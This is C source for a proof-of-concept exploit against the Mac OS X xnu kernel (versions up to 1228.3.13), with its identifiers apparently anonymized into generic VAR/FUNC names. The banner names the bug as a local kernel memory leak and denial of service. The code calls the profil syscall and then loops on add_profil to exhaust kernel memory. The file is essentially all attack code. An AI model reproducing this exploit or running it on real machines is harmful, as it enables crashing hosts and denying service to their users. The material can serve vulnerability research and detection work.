
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int FUNC_0 (int ) ;
 int FUNC_1 (int ) ;
 int FUNC_2 (int ,char*,char*,int) ;
 int FUNC_3 () ;
 int FUNC_4 (char*,...) ;
 int FUNC_5 (int) ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_6 (int ,char**,int,int ,int) ;

int
FUNC_7 (int VAR_7, char **VAR_8)
{
  char VAR_9[1024];
  int VAR_10, VAR_11;

  FUNC_4 ("Apple MACOS X xnu <= 1228.3.13 local kernel memory leak/DoS PoC\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  FUNC_4 ("* opening profil, pid: %d...", FUNC_3 ());
  if ((VAR_11 = FUNC_6 (VAR_4, &VAR_9, sizeof VAR_9, 0, 1)) < 0)
    {
      FUNC_2 (VAR_5, "\n%s: syscall [SYS_profil]: failed: %d\n",
               VAR_8[0], VAR_11);
      FUNC_0 (VAR_0);
    }
  FUNC_4 ("done\n");

  FUNC_4 ("* filling %d-bytes of kernel memory...\n", VAR_2 * 32);
  FUNC_1 (VAR_6);

  for (VAR_10 = 0; VAR_10 < VAR_2; VAR_10++)
    {
      if ((VAR_11 = FUNC_6 (VAR_3, &VAR_9, sizeof VAR_9, 0, 1)) < 0)
        {
          FUNC_2 (VAR_5, "\n%s: syscall [SYS_add_profil]: failed: %d\n",
                   VAR_8[0], VAR_11);
          FUNC_0 (VAR_0);
        }
      FUNC_4 ("** %d-bytes filled\r", VAR_10 * 32);
    }
  FUNC_4 ("\n* done\n");

  while (1)
    FUNC_5 (1);

  return (VAR_1);
}
